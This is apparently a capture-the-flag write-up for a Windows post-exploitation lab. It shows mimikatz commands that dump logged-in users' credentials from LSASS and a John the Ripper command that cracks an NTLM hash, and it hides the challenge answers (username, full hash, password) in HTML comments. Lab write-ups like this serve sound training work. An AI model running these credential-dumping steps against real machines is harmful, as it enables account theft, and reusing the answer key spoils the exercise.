# DAY 24 - Learning From The Grinch

## Learning Objectives

In this task you will:

* Understand post exploitation
* Understand how passwords are stored on Windows
* Dump passwords from LSASS process on Windows
* Crack Password Hashes

## Dumping Password hashes
A standard tool used to retrieve password hashes from memory is called `mimikatz` (https://github.com/gentilkiwi/mimikatz).

For this exercise, we'll be using the `sekurlsa` module.

## Mimikatz

### Check priv
```ps
mimikatz # privilege::debug
```
If we have privilege (`privilege::debug`) we can run `securlsa` module and use `logonpasswords` to extract logged in users.

```ps
mimikatz # sekurlsa::logonpasswords
```

## Tasks

### What is the username of the other user on the system?

```
e***y
```
<!-- emily -->


### What is the NTLM hash of this user?

```
8af**********************cf5
```
<!-- 8af326aa4850225b75c592d4ce19ccf5 -->

### What is the password for this user?


#### Crack hash
!! we can not run this command on `John The Ripper` found in apt repos.

Looks like it has to be built from sources.

May be need to build `Jumbo` - Community supported version of `JtR`.


```bahs
echo '8af**********************cf5' > hash.txt
```
```bash
john --format=NT -w=/opt/wordlists/rockyou.txt hash.txt --pot=output.txt
```

```bash
cat output.txt

$NT$8af3************************cf5:12********90
```
<!-- 1234567890 -->
